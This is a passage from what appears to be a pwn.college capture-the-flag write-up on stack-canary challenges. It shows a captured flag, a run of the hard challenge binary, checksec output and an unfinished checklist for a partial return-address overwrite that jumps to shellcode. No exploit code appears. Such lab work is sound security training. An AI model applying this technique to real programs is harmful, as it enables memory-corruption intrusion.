+Goodbye!
+$
+```
+
+```
+hacker@program-security~canary-conundrum-easy:~$ cat ~/Z
+pwn.college{cJIS-f-sugSuEKEz6s6qqZke17K.01MyMDL4ITM0EzW}
+```
+
+&nbsp;
+
+## Canary Conundrum (Hard)
+
+```
+hacker@program-security~canary-conundrum-hard:/$ /challenge/canary-conundrum-hard 
+###
+### Welcome to /challenge/canary-conundrum-hard!
+###
+
+Payload size: 2
+Send your payload (up to 2 bytes)!
+aa
+You said: aa
+Goodbye!
+### Goodbye!
+```
+
+Requirements for crafting an exploit
+
+```
+hacker@program-security~canary-conundrum-hard:/$ checksec /challenge/canary-conundrum-hard 
+[*] '/challenge/canary-conundrum-hard'
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      Canary found
+    NX:         NX unknown - GNU_STACK missing
+    PIE:        PIE enabled
+    Stack:      Executable
+    RWX:        Has RWX segments
+    SHSTK:      Enabled
+    IBT:        Enabled
+```
+
+This time, we will have to partially overwrite the return address to the address of our shellcode.
+
+Requirements for crafting an exploit.
+
+- [ ] Location of `nth` buffer
+- [ ] Offset between buffers of `n`th and `n+1`th frames of the `challenge()` function.
+- [ ] Offset of the canary from the buffer
+- [ ] 
